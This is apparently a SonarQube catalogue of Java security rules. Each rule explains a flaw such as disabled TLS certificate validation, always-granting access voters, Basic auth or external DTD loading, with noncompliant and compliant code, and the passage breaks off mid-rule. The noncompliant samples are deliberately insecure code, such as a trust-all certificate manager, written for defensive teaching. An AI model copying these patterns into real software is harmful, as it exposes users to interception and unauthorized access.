<ul><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2006-5901" rel="nofollow">CVE-2006-5901</a> </li><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2005-3725" rel="nofollow">CVE-2005-3725</a> </li></ul>
<p>Today’s services have an ever-changing architecture due to their scaling and redundancy needs. It is a mistake to think that a service will always
have the same IP address. When it does change, the hardcoded IP will have to be modified too. This will have an impact on the product development,
delivery, and deployment:</p>
<ul><li> The developers will have to do a rapid fix every time this happens, instead of having an operation team change a configuration file. </li><li> It misleads to use the same address in every environment (dev, sys, qa, prod). </li></ul>
<p>Last but not least it has an effect on application security. Attackers might be able to decompile the code and thereby discover a potentially
sensitive address. They can perform a Denial of Service attack on the service, try to get access to the system, or try to spoof the IP address to
bypass security checks. Such attacks can always be possible, but in the case of a hardcoded IP address solving the issue will take more time, which
will increase an attack’s impact.</p>
<h2>Ask Yourself Whether</h2>
<p>The disclosed IP address is sensitive, e.g.:</p>
<ul><li> Can give information to an attacker about the network topology. </li><li> It’s a personal (assigned to an identifiable person) IP address. </li></ul>
<p>There is a risk if you answered yes to any of these questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Don’t hard-code the IP address in the source code, instead make it configurable with environment variables, configuration files, or a similar
approach. Alternatively, if confidentially is not required a domain name can be used since it allows to change the destination quickly without having
to rebuild the software.</p>
<h2>Sensitive Code Example</h2>
<pre>
String ip &#61; &#34;192.168.12.42&#34;; // Sensitive
Socket socket &#61; new Socket(ip, 6667);
</pre>
<h2>Compliant Solution</h2>
<pre>
String ip &#61; System.getenv(&#34;IP_ADDRESS&#34;); // Compliant
Socket socket &#61; new Socket(ip, 6667);
</pre>
<h2>Exceptions</h2>
<p>No issue is reported for the following cases because they are not considered sensitive:</p>
<ul><li> Loopback addresses 127.0.0.0/8 in CIDR notation (from 127.0.0.0 to 127.255.255.255) </li><li> Broadcast address 255.255.255.255 </li><li> Non-routable address 0.0.0.0 </li><li> Strings of the form <code>2.5.&lt;number&gt;.&lt;number&gt;</code> as they <a href="http://www.oid-info.com/introduction.htm" rel="nofollow">often match
  Object Identifiers</a> (OID) </li><li> Addresses in the ranges 192.0.2.0/24, 198.51.100.0/24, 203.0.113.0/24, reserved for documentation purposes by <a href="https://datatracker.ietf.org/doc/html/rfc5737" rel="nofollow">RFC 5737</a> </li><li> Addresses in the range 2001:db8::/32, reserved for documentation purposes by <a href="https://datatracker.ietf.org/doc/html/rfc3849" rel="nofollow">RFC
  3849</a> </li></ul>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://wiki.sei.cmu.edu/confluence/x/OjdGBQ" rel="nofollow">CERT, MSC03-J.</a> - Never hard code sensitive information </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=java:S2647">
              java:S2647
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Basic authentication’s only means of obfuscation is Base64 encoding. Since Base64 encoding is easily recognized and reversed, it offers only the
thinnest veil of protection to your users, and should not be used.</p>
<h3>Noncompliant code example</h3>
<pre>
// Using HttpPost from Apache HttpClient
String encoding &#61; Base64Encoder.encode (&#34;login:passwd&#34;);
org.apache.http.client.methods.HttpPost httppost &#61; new HttpPost(url);
httppost.setHeader(&#34;Authorization&#34;, &#34;Basic &#34; &#43; encoding);  // Noncompliant

or

// Using HttpURLConnection
String encoding &#61; Base64.getEncoder().encodeToString((&#34;login:passwd&#34;).getBytes(‌&#34;UTF‌​-8&#34;​));
HttpURLConnection conn &#61; (HttpURLConnection) url.openConnection();
conn.setRequestMethod(&#34;POST&#34;);
conn.setDoOutput(true);
conn.setRequestProperty(&#34;Authorization&#34;, &#34;Basic &#34; &#43; encoding); // Noncompliant
</pre>
<h2>Resources</h2>
<ul><li> <a href="https://owasp.org/Top10/A04_2021-Insecure_Design/" rel="nofollow">OWASP Top 10 2021 Category A4</a> - Insecure Design </li><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://cheatsheetseries.owasp.org/cheatsheets/Web_Service_Security_Cheat_Sheet.html#user-authentication" rel="nofollow">OWASP Web Service Security
  Cheat Sheet</a> </li><li> <a href="https://cwe.mitre.org/data/definitions/522" rel="nofollow">MITRE, CWE-522</a> - Insufficiently Protected Credentials </li><li> <a href="https://www.sans.org/top25-software-errors/#cat3" rel="nofollow">SANS Top 25</a> - Porous Defenses </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=java:S4830">
              java:S4830
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability makes it possible that an encrypted communication is intercepted.</p>
<h2>Why is this an issue?</h2>
<p>Transport Layer Security (TLS) provides secure communication between systems over the internet by encrypting the data sent between them. The role
of certificate validation in this process is to ensure that a system is indeed the one it claims to be, adding an extra layer of trust and
security.</p>
<p>When certificate validation is disabled, the client skips this critical check. This creates an opportunity for attackers to pose as a trusted
entity and intercept, manipulate, or steal the data being transmitted.</p>
<h3>What is the potential impact?</h3>
<p>Establishing trust in a secure way is a non-trivial task. When you disable certificate validation, you are removing a key mechanism designed to
build this trust in internet communication, opening your system up to a number of potential threats.</p>
<h4>Identity spoofing</h4>
<p>If a system does not validate certificates, it cannot confirm the identity of the other party involved in the communication. An attacker can
exploit this by creating a fake server and masquerading it as a legitimate one. For example, they might set up a server that looks like your bank’s
server, tricking your system into thinking it is communicating with the bank. This scenario, called identity spoofing, allows the attacker to collect
any data your system sends to them, potentially leading to significant data breaches.</p>
<h4>Loss of data integrity</h4>
<p>When TLS certificate validation is disabled, the integrity of the data you send and receive cannot be guaranteed. An attacker could modify the data
in transit, and you would have no way of knowing. This could range from subtle manipulations of the data you receive to the injection of malicious
code or malware into your system. The consequences of such breaches of data integrity can be severe, depending on the nature of the data and the
system.</p>
<h2>How to fix it in Java Cryptographic Extension</h2>
<h3>Code examples</h3>
<p>The following code contains examples of disabled certificate validation.</p>
<p>The certificate validation gets disabled by overriding <code>X509TrustManager</code> with an empty implementation. It is highly recommended to use
the original implementation.</p>
<h4>Noncompliant code example</h4>
<pre>
class TrustAllManager implements X509TrustManager {

    &#64;Override
    public void checkClientTrusted(X509Certificate[] chain, String authType) throws CertificateException {  // Noncompliant
    }

    &#64;Override
    public void checkServerTrusted(X509Certificate[] chain, String authType) throws CertificateException { // Noncompliant
    }

    &#64;Override
    public X509Certificate[] getAcceptedIssuers() {
        return null;
    }
}
</pre>
<h3>How does this work?</h3>
<p>Addressing the vulnerability of disabled TLS certificate validation primarily involves re-enabling the default validation.</p>
<p>To avoid running into problems with invalid certificates, consider the following sections.</p>
<h4>Using trusted certificates</h4>
<p>If possible, always use a certificate issued by a well-known, trusted CA for your server. Most programming environments come with a predefined list
of trusted root CAs, and certificates issued by these authorities are validated automatically. This is the best practice, and it requires no
additional code or configuration.</p>
<h4>Working with self-signed certificates or non-standard CAs</h4>
<p>In some cases, you might need to work with a server using a self-signed certificate, or a certificate issued by a CA not included in your trusted
roots. Rather than disabling certificate validation in your code, you can add the necessary certificates to your trust store.</p>
<p>Here is a sample command to import a certificate to the Java trust store:</p>
<pre>
keytool -import -alias myserver -file myserver.crt -keystore cacerts
</pre>
<h2>Resources</h2>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li><li> <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/" rel="nofollow">OWASP Top 10 2021 Category A7</a> - Identification and
  Authentication Failures </li><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m3-insecure-communication" rel="nofollow">OWASP Mobile Top 10 2016 Category M3</a> - Insecure
  Communication </li><li> <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x10-v5-network_communication_requirements" rel="nofollow">Mobile AppSec Verification
  Standard</a> - Network Communication Requirements </li><li> <a href="https://cwe.mitre.org/data/definitions/295" rel="nofollow">MITRE, CWE-295</a> - Improper Certificate Validation </li><li> <a href="https://wiki.sei.cmu.edu/confluence/display/java/MSC61-J.&#43;Do&#43;not&#43;use&#43;insecure&#43;or&#43;weak&#43;cryptographic&#43;algorithms" rel="nofollow">https://wiki.sei.cmu.edu/confluence/display/java/MSC61-J.&#43;Do&#43;not&#43;use&#43;insecure&#43;or&#43;weak&#43;cryptographic&#43;algorithms</a> </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=java:S5808">
              java:S5808
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Authorizations granted or not to users to access resources of an application should be based on strong decisions. For instance, checking whether
the user is authenticated or not, has the right roles/privileges. It may also depend on the user’s location, or the date, time when the user requests
access.</p>
<h3>Noncompliant code example</h3>
<p>In a Spring-security web application:</p>
<ul><li> the <code>vote</code> method of an <a href="https://docs.spring.io/spring-security/site/docs/4.0.x/apidocs/org/springframework/security/access/AccessDecisionVoter.html" rel="nofollow">AccessDecisionVoter</a> type is not compliant when it returns only an affirmative decision (<code>ACCESS_GRANTED</code>) or abstains to make a decision (<code>ACCESS_ABSTAIN</code>): </li></ul>
<pre>
public class WeakNightVoter implements AccessDecisionVoter {
    &#64;Override
    public int vote(Authentication authentication, Object object, Collection collection) {  // Noncompliant

      Calendar calendar &#61; Calendar.getInstance();

      int currentHour &#61; calendar.get(Calendar.HOUR_OF_DAY);

      if(currentHour &gt;&#61; 8 &amp;&amp; currentHour &lt;&#61; 19) {
        return ACCESS_GRANTED; // Noncompliant
      }

      // when users connect during the night, do not make decision
      return ACCESS_ABSTAIN; // Noncompliant
    }
}
</pre>
<ul><li> the <code>hasPermission</code> method of a <a href="https://docs.spring.io/spring-security/site/docs/4.2.13.RELEASE/apidocs/org/springframework/security/access/PermissionEvaluator.html" rel="nofollow">PermissionEvaluator</a> type is not compliant when it doesn’t return <code>false</code>: </li></ul>
<pre>
public class MyPermissionEvaluator implements PermissionEvaluator {
    &#64;Override
    public boolean hasPermission(Authentication authentication, Object targetDomainObject, Object permission) {
        //Getting subject
        Object user &#61; authentication.getPrincipal();

        if(user.getRole().equals(permission)) {
              return true; // Noncompliant
        }

        return true;  // Noncompliant
    }
}
</pre>
<h3>Compliant solution</h3>
<p>In a Spring-security web application:</p>
<ul><li> the <code>vote</code> method of an <a href="https://docs.spring.io/spring-security/site/docs/4.0.x/apidocs/org/springframework/security/access/AccessDecisionVoter.html" rel="nofollow">AccessDecisionVoter</a> type should return a negative decision (<code>ACCESS_DENIED</code>): </li></ul>
<pre>
public class StrongNightVoter implements AccessDecisionVoter {
    &#64;Override
    public int vote(Authentication authentication, Object object, Collection collection) {

      Calendar calendar &#61; Calendar.getInstance();

      int currentHour &#61; calendar.get(Calendar.HOUR_OF_DAY);

      if(currentHour &gt;&#61; 8 &amp;&amp; currentHour &lt;&#61; 19) {
        return ACCESS_GRANTED;
      }

      // users are not allowed to connect during the night
      return ACCESS_DENIED; // Compliant
    }
}
</pre>
<ul><li> the <code>hasPermission</code> method of a <a href="https://docs.spring.io/spring-security/site/docs/4.2.13.RELEASE/apidocs/org/springframework/security/access/PermissionEvaluator.html" rel="nofollow">PermissionEvaluator</a> type should return <code>false</code>: </li></ul>
<pre>
public class MyPermissionEvaluator implements PermissionEvaluator {
    &#64;Override
    public boolean hasPermission(Authentication authentication, Object targetDomainObject, Object permission) {
        //Getting subject
        Object user &#61; authentication.getPrincipal();

        if(user.getRole().equals(permission)) {
              return true;
        }

        return false; // Compliant
    }
}
</pre>
<h3>Exceptions</h3>
<p>No issue is reported when the method throws an exception as it might be used to indicate a strong decision.</p>
<h2>Resources</h2>
<ul><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control" rel="nofollow">OWASP Top 10 2017 Category A5</a> - Broken Access Control
  </li><li> <a href="https://cwe.mitre.org/data/definitions/285" rel="nofollow">MITRE, CWE-285</a> - Improper Authorization </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=java:S2658">
              java:S2658
            </a>
          </td>
          <td>
            <details>
              <p>This rule is deprecated; use <a href="/organizations/sopra-steria/rules?open&#61;javasecurity%3AS6173&amp;rule_key&#61;javasecurity%3AS6173" rel="nofollow">S6173</a> instead.</p>
<h2>Why is this an issue?</h2>
<p>Dynamically loaded classes could contain malicious code executed by a static class initializer. I.E. you wouldn’t even have to instantiate or
explicitly invoke methods on such classes to be vulnerable to an attack.</p>
<p>This rule raises an issue for each use of dynamic class loading.</p>
<h3>Noncompliant code example</h3>
<pre>
String className &#61; System.getProperty(&#34;messageClassName&#34;);
Class clazz &#61; Class.forName(className);  // Noncompliant
</pre>
<h2>Resources</h2>
<ul><li> <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection" rel="nofollow">OWASP Top 10 2017 Category A1</a> - Injection </li><li> <a href="https://cwe.mitre.org/data/definitions/470" rel="nofollow">MITRE, CWE-470</a> - Use of Externally-Controlled Input to Select Classes or Code (&#39;Unsafe
  Reflection&#39;) </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=java:S5804">
              java:S5804
            </a>
          </td>
          <td>
            <details>
              <p>User enumeration refers to the ability to guess existing usernames in a web application database. This can happen, for example, when using
&#34;sign-in/sign-on/forgot password&#34; functionalities of a website.</p>
<p>When an user tries to &#34;sign-in&#34; to a website with an incorrect username/login, the web application should not disclose that the username doesn’t
exist with a message similar to &#34;this username is incorrect&#34;, instead a generic message should be used like &#34;bad credentials&#34;, this way it’s not
possible to guess whether the username or password was incorrect during the authentication.</p>
<p>If a user-management feature discloses information about the existence of a username, attackers can use brute force attacks to retrieve a large
amount of valid usernames that will impact the privacy of corresponding users and facilitate other attacks (phishing, password guessing etc …​).</p>
<h2>Ask Yourself Whether</h2>
<ul><li> The application discloses that a username exists in its database: most of the time it’s possible to avoid this kind of leak except for the
  &#34;registration/sign-on&#34; part of a website because in this case the user must choose a valid username (not already taken by another user). </li><li> There is no rate limiting and CAPTCHA protection in place for requests involving a username. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>When a user performs a request involving a username, it should not be possible to spot differences between a valid and incorrect username:</p>
<ul><li> Error messages should be generic and not disclose if the username is valid or not. </li><li> The response time must be similar for a valid username or not. </li><li> CAPTCHA and other rate limiting solutions should be implemented. </li></ul>
<h2>Sensitive Code Example</h2>
<p>In a Spring-security web application the username leaks when:</p>
<ul><li> The string used as argument of <a href="https://docs.spring.io/spring-security/site/docs/current/api/org/springframework/security/core/userdetails/UserDetailsService.html" rel="nofollow">loadUserByUsername</a> method is used in an exception message: </li></ul>
<pre>
public String authenticate(String username, String password) {
  // ....
  MyUserDetailsService s1 &#61; new MyUserDetailsService();
  MyUserPrincipal u1 &#61; s1.loadUserByUsername(username);

  if(u1 &#61;&#61; null) {
    throw new BadCredentialsException(username&#43;&#34; doesn&#39;t exist in our database&#34;); // Sensitive
  }
  // ....
}
</pre>
<ul><li> <a href="https://docs.spring.io/spring-security/site/docs/3.0.x/apidocs/org/springframework/security/core/userdetails/UsernameNotFoundException.html" rel="nofollow">UsernameNotFoundException</a> is thrown (except when it is in the loadUserByUsername method): </li></ul>
<pre>
public String authenticate(String username, String password) {
  // ....
  if(user &#61;&#61; null) {
      throw new UsernameNotFoundException(&#34;user not found&#34;); // Sensitive
  }
  // ....
}
</pre>
<ul><li> <a href="https://docs.spring.io/spring-security/site/docs/4.0.x/apidocs/org/springframework/security/authentication/dao/AbstractUserDetailsAuthenticationProvider.html#setHideUserNotFoundExceptions-boolean-" rel="nofollow">HideUserNotFoundExceptions</a> is set to false: </li></ul>
<pre>
DaoAuthenticationProvider daoauth &#61; new DaoAuthenticationProvider();
daoauth.setUserDetailsService(new MyUserDetailsService());
daoauth.setPasswordEncoder(new BCryptPasswordEncoder());
daoauth.setHideUserNotFoundExceptions(false); // Sensitive
builder.authenticationProvider(daoauth);
</pre>
<h2>Compliant Solution</h2>
<p>In a Spring-security web application:</p>
<ul><li> the same message should be used regardless of whether it is the wrong user or password: </li></ul>
<pre>
public String authenticate(String username, String password) throws AuthenticationException {
  Details user &#61; null;
  try {
    user &#61; loadUserByUsername(username);
  } catch (UsernameNotFoundException | DataAccessException e) {
    // Hide this exception reason to not disclose that the username doesn&#39;t exist
  }
  if (user &#61;&#61; null || !user.isPasswordCorrect(password)) {
     // User should not be able to guess if the bad credentials message is related to the username or the password
    throw new BadCredentialsException(&#34;Bad credentials&#34;);
  }
}
</pre>
<ul><li> <a href="https://docs.spring.io/spring-security/site/docs/4.0.x/apidocs/org/springframework/security/authentication/dao/AbstractUserDetailsAuthenticationProvider.html#setHideUserNotFoundExceptions-boolean-" rel="nofollow">HideUserNotFoundExceptions</a> should be set to true: </li></ul>
<pre>
DaoAuthenticationProvider daoauth &#61; new DaoAuthenticationProvider();
daoauth.setUserDetailsService(new MyUserDetailsService());
daoauth.setPasswordEncoder(new BCryptPasswordEncoder());
daoauth.setHideUserNotFoundExceptions(true); // Compliant
builder.authenticationProvider(daoauth);
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li><li> <a href="https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A2-Broken_Authentication" rel="nofollow">OWASP Top 10 2017 Category A2</a> -
  Broken Authentication </li><li> <a href="https://cwe.mitre.org/data/definitions/200" rel="nofollow">MITRE, CWE-200</a> - Exposure of Sensitive Information to an Unauthorized Actor </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=java:S6263">
              java:S6263
            </a>
          </td>
          <td>
            <details>
              <p>In AWS, long-term access keys will be valid until you manually revoke them. This makes them highly sensitive as any exposure can have serious
consequences and should be used with care.</p>
<p>This rule will trigger when encountering an instantiation of <code>com.amazonaws.auth.BasicAWSCredentials</code>.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> The access key is used directly in an application or AWS CLI script running on an Amazon EC2 instance. </li><li> Cross-account access is needed. </li><li> The access keys need to be embedded within a mobile application. </li><li> Existing identity providers (SAML 2.0, on-premises identity store) already exists. </li></ul>
<p>For more information, see <a href="https://docs.aws.amazon.com/general/latest/gr/aws-access-keys-best-practices.html#use-roles" rel="nofollow">Use IAM roles
instead of long-term access keys</a>.</p>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Consider using IAM roles or other features of the AWS Security Token Service that provide temporary credentials, limiting the risks.</p>
<h2>Sensitive Code Example</h2>
<pre>
import com.amazonaws.auth.AWSCredentials;
import com.amazonaws.auth.BasicAWSCredentials;
// ...

AWSCredentials awsCredentials &#61; new BasicAWSCredentials(accessKeyId, secretAccessKey);
</pre>
<h2>Compliant Solution</h2>
<p>Example for AWS STS (see <a href="https://docs.aws.amazon.com/sdk-for-java/v1/developer-guide/prog-services-sts.html" rel="nofollow">Getting Temporary Credentials
with AWS STS</a>).</p>
<pre>
BasicSessionCredentials sessionCredentials &#61; new BasicSessionCredentials(
   session_creds.getAccessKeyId(),
   session_creds.getSecretAccessKey(),
   session_creds.getSessionToken());
</pre>
<h2>See</h2>
<ul><li> <a href="https://docs.aws.amazon.com/general/latest/gr/aws-access-keys-best-practices.html" rel="nofollow">Best practices for managing AWS access keys</a>
  </li><li> <a href="https://docs.aws.amazon.com/IAM/latest/UserGuide/id_credentials_access-keys.html" rel="nofollow">Managing access keys for IAM users</a> </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=java:S6363">
              java:S6363
            </a>
          </td>
          <td>
            <details>
              <p>WebViews can be used to display web content as part of a mobile application. A browser engine is used to render and display the content. Like a web
application, a mobile application that uses WebViews can be vulnerable to Cross-Site Scripting if untrusted code is rendered.</p>
<p>If malicious JavaScript code in a WebView is executed this can leak the contents of sensitive files when access to local files is enabled.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> No local files have to be accessed by the Webview. </li><li> The WebView contains untrusted data that could cause harm when rendered. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It is recommended to disable access to local files for WebViews unless it is necessary. In the case of a successful attack through a Cross-Site
Scripting vulnerability the attackers attack surface decreases drastically if no files can be read out.</p>
<h2>Sensitive Code Example</h2>
<pre>
import android.webkit.WebView;

WebView webView &#61; (WebView) findViewById(R.id.webview);
webView.getSettings().setAllowFileAccess(true); // Sensitive
webView.getSettings().setAllowContentAccess(true); // Sensitive
</pre>
<h2>Compliant Solution</h2>
<pre>
import android.webkit.WebView;

WebView webView &#61; (WebView) findViewById(R.id.webview);
webView.getSettings().setAllowFileAccess(false);
webView.getSettings().setAllowContentAccess(false);
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A03_2021-Injection/" rel="nofollow">OWASP Top 10 2021 Category A3</a> - Injection </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration.html" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_%28XSS%29" rel="nofollow">OWASP Top 10 2017 Category A7</a> - Cross-Site
  Scripting (XSS) </li><li> <a href="https://cwe.mitre.org/data/definitions/79" rel="nofollow">MITRE, CWE-79</a> - Improper Neutralization of Input During Web Page Generation
  (&#39;Cross-site Scripting&#39;) </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=java:S6362">
              java:S6362
            </a>
          </td>
          <td>
            <details>
              <p>WebViews can be used to display web content as part of a mobile application. A browser engine is used to render and display the content. Like a web
application, a mobile application that uses WebViews can be vulnerable to Cross-Site Scripting if untrusted code is rendered. In the context of a
WebView, JavaScript code can exfiltrate local files that might be sensitive or even worse, access exposed functions of the application that can result
in more severe vulnerabilities such as code injection. Thus JavaScript support should not be enabled for WebViews unless it is absolutely necessary
and the authenticity of the web resources can be guaranteed.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> The WebWiew only renders static web content that does not require JavaScript code to be executed. </li><li> The WebView contains untrusted data that could cause harm when rendered. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It is recommended to disable JavaScript support for WebViews unless it is necessary to execute JavaScript code. Only trusted pages should be
rendered.</p>
<h2>Sensitive Code Example</h2>
<pre>
import android.webkit.WebView;

WebView webView &#61; (WebView) findViewById(R.id.webview);
webView.getSettings().setJavaScriptEnabled(true); // Sensitive
</pre>
<h2>Compliant Solution</h2>
<pre>
import android.webkit.WebView;

WebView webView &#61; (WebView) findViewById(R.id.webview);
webView.getSettings().setJavaScriptEnabled(false);
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A03_2021-Injection/" rel="nofollow">OWASP Top 10 2021 Category A3</a> - Injection </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration.html" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_%28XSS%29" rel="nofollow">OWASP Top 10 2017 Category A7</a> - Cross-Site
  Scripting (XSS) </li><li> <a href="https://cwe.mitre.org/data/definitions/79" rel="nofollow">MITRE, CWE-79</a> - Improper Neutralization of Input During Web Page Generation
  (&#39;Cross-site Scripting&#39;) </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=java:S6377">
              java:S6377
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>XML signature validations work by parsing third-party data that cannot be trusted until it is actually validated.</p>
<p>As with any other parsing process, unrestricted validation of third-party XML signatures can lead to security vulnerabilities. In this case,
threats range from denial of service to confidentiality breaches.</p>
<p>By default, the Java XML Digital Signature API does not apply restrictions on XML signature validation, unless the application runs with a security
manager.<br /> To protect the application from these vulnerabilities, set the <code>org.jcp.xml.dsig.secureValidation</code> attribute to
<code>true</code> with the <code>javax.xml.crypto.dsig.dom.DOMValidateContext.setProperty</code> method.<br /> This attribute ensures that the code
enforces the following restrictions:</p>
<ul><li> Forbids the use of XSLT transforms </li><li> Restricts the number of <code>SignedInfo</code> or <code>Manifest Reference</code> elements to 30 or less </li><li> Restricts the number of <code>Reference</code> transforms to 5 or less </li><li> Forbids the use of MD5-related signatures or MAC algorithms </li><li> Ensures that <code>Reference</code> IDs are unique to help prevent signature wrapping attacks </li><li> Forbids Reference URIs of type <code>http</code>, <code>https</code>, or <code>file</code> </li><li> Does not allow a <code>RetrievalMethod</code> element to reference another <code>RetrievalMethod</code> element </li><li> Forbids RSA or DSA keys less than 1024 bits </li></ul>
<h3>Noncompliant code example</h3>
<pre>
NodeList signatureElement &#61; doc.getElementsByTagNameNS(XMLSignature.XMLNS, &#34;Signature&#34;);

XMLSignatureFactory fac &#61; XMLSignatureFactory.getInstance(&#34;DOM&#34;);
DOMValidateContext valContext &#61; new DOMValidateContext(new KeyValueKeySelector(), signatureElement.item(0)); // Noncompliant
XMLSignature signature &#61; fac.unmarshalXMLSignature(valContext);

boolean signatureValidity &#61; signature.validate(valContext);
</pre>
<h3>Compliant solution</h3>
<p>In order to benefit from this secure validation mode, set the DOMValidateContext’s <code>org.jcp.xml.dsig.secureValidation</code> property to
<code>TRUE</code>.</p>
<pre>
NodeList signatureElement &#61; doc.getElementsByTagNameNS(XMLSignature.XMLNS, &#34;Signature&#34;);

XMLSignatureFactory fac &#61; XMLSignatureFactory.getInstance(&#34;DOM&#34;);
DOMValidateContext valContext &#61; new DOMValidateContext(new KeyValueKeySelector(), signatureElement.item(0));
valContext.setProperty(&#34;org.jcp.xml.dsig.secureValidation&#34;, Boolean.TRUE);
XMLSignature signature &#61; fac.unmarshalXMLSignature(valContext);

boolean signatureValidity &#61; signature.validate(valContext);
</pre>
<h2>Resources</h2>
<ul><li> <a href="https://docs.oracle.com/en/java/javase/14/security/java-xml-digital-signature-api-overview-and-tutorial.html#GUID-DB46A001-6DBD-4571-BDBC-1BBC394BF61E" rel="nofollow">Oracle Java Documentation</a> - XML Digital Signature API Overview and Tutorial </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://cwe.mitre.org/data/definitions/347" rel="nofollow">MITRE, CWE-347</a> - Improper Verification of Cryptographic Signature </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=java:S6374">
              java:S6374
            </a>
          </td>
          <td>
            <details>
              <p>This rule is deprecated; use <a href="/organizations/sopra-steria/rules?open&#61;java%3AS2755&amp;rule_key&#61;java%3AS2755" rel="nofollow">S2755</a> instead.</p>
<h2>Why is this an issue?</h2>
<p>By default XML processors attempt to load all XML schemas and DTD (their locations are defined with <code>xsi:schemaLocation</code> attributes and
<code>DOCTYPE</code> declarations), potentially from an external storage such as file system or network, which may lead, if no restrictions are put in
place, to <a href="https://owasp.org/www-community/attacks/Server_Side_Request_Forgery" rel="nofollow">server-side request forgery (SSRF)</a> vulnerabilities.</p>
<h3>Noncompliant code example</h3>
<p>For <a href="https://docs.oracle.com/javase/9/docs/api/javax/xml/parsers/DocumentBuilderFactory.html" rel="nofollow">DocumentBuilder</a>, <a href="https://docs.oracle.com/javase/9/docs/api/javax/xml/parsers/SAXParserFactory.html" rel="nofollow">SAXParser</a> and <a href="https://docs.oracle.com/javase/9/docs/api/javax/xml/validation/SchemaFactory.html" rel="nofollow">Schema</a> JAPX factories:</p>
<pre>
DocumentBuilderFactory factory &#61; DocumentBuilderFactory.newInstance();
factory.setValidating(true); // Noncompliant
factory.setFeature(&#34;http://apache.org/xml/features/nonvalidating/load-external-dtd&#34;, true); // Noncompliant

SAXParserFactory factory &#61; SAXParserFactory.newInstance();
factory.setValidating(true); // Noncompliant
factory.setFeature(&#34;http://apache.org/xml/features/nonvalidating/load-external-dtd&#34;, true); // Noncompliant

